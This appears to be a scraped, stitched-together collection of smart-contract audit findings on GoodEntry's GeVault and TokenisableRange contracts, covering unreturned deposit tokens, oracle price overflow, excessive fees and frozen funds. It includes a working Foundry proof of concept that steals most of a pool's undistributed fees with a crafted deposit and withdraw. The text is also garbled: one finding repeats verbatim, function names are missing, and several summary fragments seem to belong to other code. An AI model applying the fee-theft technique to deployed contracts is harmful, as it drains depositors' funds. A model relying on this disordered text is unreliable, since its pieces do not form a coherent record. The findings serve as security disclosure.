The report suggests that the vulnerability lies in the calculations of share distribution which fail to handle cases where the result of division is a fraction less than 1.

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

This sets the initial share price extremely low. Afterwards, should someone - like an attacker - transfer a large number of tokens directly to the contract without going through the deposit function, subsequent legitimate depositors would receive an unfairly low number of shares for their deposits.\n\nMoreover, as per the report, through the outlined steps, an attacker could make a minimal deposit, transfer a significant amount of tokens directly to the contract, and then withdraw a disproportional amount of the pool by redeeming an initially small amount of shares. They could leverage this to extract most of the value from the pool, resulting in a loss for any other depositors.\n\nA proof of concept (PoC) would entail a series of smart contract interactions where you:\n\n1.

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL. Reason: Arithmetic over/underflow] testOraclePrice() \n```\n\nThis will cause calculation still overflow, even using the widely used WBTC/WETH pair \n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nConsider to change the scale down using the recommended value from uniswap v3 library:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\n\nor change the scale down similar to the one used inside library\n\n```diff\n  function poolMatchesOracle() public view returns (bool matches){\n    (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();\n    \n    uint decimals0 = token0.decimals();\n    uint decimals1 = token1.decimals();\n    uint priceX8 = 10**decimals0;\n    // Overflow if dont scale down the sqrtPrice before div 2*192\n-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;\n+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;\n    priceX8 = priceX8 / 10**decimals1;\n    uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));\n    if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;\n  }\n```\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"

However, if price moves outside the range during the transaction, user will be charged an excessive fee.\n\n## Proof of Concept\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nSuppose range is [120, 122] and current price is 121. Alice calls `deposit` with `{n0: 100, n1:100} `, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning), `getAmountsForLiquidity` will return 0 for `token1Amount`. As a result, `newFee1` will be equal to `n1`, which means all the 100 token1 will be charged as fee.\n\n    (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n      INonfungiblePositionManager.IncreaseLiquidityParams({\n        tokenId: tokenId,\n        amount0Desired: n0,\n        amount1Desired: n1,\n        amount0Min: n0 * 95 / 100,\n        amount1Min: n1 * 95 / 100,\n        deadline: block.timestamp\n      })\n    );\n\nThen, `increaseLiquidity` will succeed since `amount1Min` is now zero.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nDon't use this to calculate fee:\n\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nAlways use this:\n\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n\n\n## Assessed type\n\nContext"

In such a case, the computation of `_shares * totalReserve[_tokenAddress]` may surpass the uint256 type's maximum value, leading to an overflow and thus an incorrect calculation of tokens per share. The provided Proof of Concept steps illustrate how the contract's `removeLiquidity` function can cause users' funds to be trapped due to a reverted transaction from an overflow.

            "link": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/85",
            "detail": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"

This division can cause the value in `incentivePool[tokenAddress]` to drastically reduce with each function call, potentially bringing the pool's balance to zero due to the integer division rounding down to the nearest whole number. This could lead to the funds associated with `tokenAddress` being effectively locked in the contract. To mitigate this vulnerability, the division by `BASE_DIVISOR` should only be applied to the part of the calculation that pertains to the fee, and not to the entire `incentivePool[tokenAddress]` balance. The corrected line of code provides an example of the proper way to account for the fee calculation when dealing with integer math in smart contracts. By dividing only the fee portion by `BASE_DIVISOR` before adding it to the pool, the values will be handled correctly, ensuring that the `incentivePool[tokenAddress]` increases accurately with the calculated fee, avoiding the unintended reduction of the pool's balance.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

The code incorrectly uses a fixed scaling factor of `1E9`, which does not accurately reflect the delta between the different decimals of `token0` and `token1`. The result is an over-inflated `sqrtPriceX96` when `token1Decimal` is greater than `token0Decimal`, leading to potential manipulation and incorrect contract behavior. The necessary fix involves correctly adjusting the divisor to account for the decimal difference, ensuring accurate calculation and preventing exploitation.",

            "detail": "\n# Vulnerability details\n\n`TokenisableRange` makes use of the `LiquidityAmounts.getAmountsForLiquidity` helper function in its ,   and  functions to convert UniswapV3 pool liquidity into estimated underlying token amounts. \n\nThis function `getAmountsForLiquidity` will trigger an arithmetic underflow whenever `sqrtRatioX96` is smaller than `sqrtRatioAX96`, causing these functions to revert until this ratio comes back in range and the math no longer overflows.\n\nSuch oracle price conditions are not only possible but also likely to happen in real market conditions, and they can be permanent (i.e. one asset permanently appreciating over the other one).\n\nMoving up the stack, assuming that `LiquidityAmounts.getAmountsForLiquidity` can revert (which is shown in the below PoC with real-world conditions), both the  and  functions can revert. In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

The `_vaultWithdraw` function expects a fixed amount out, but receives a scaled-down amount, which is not the correct representation of the tokens to be extracted.",

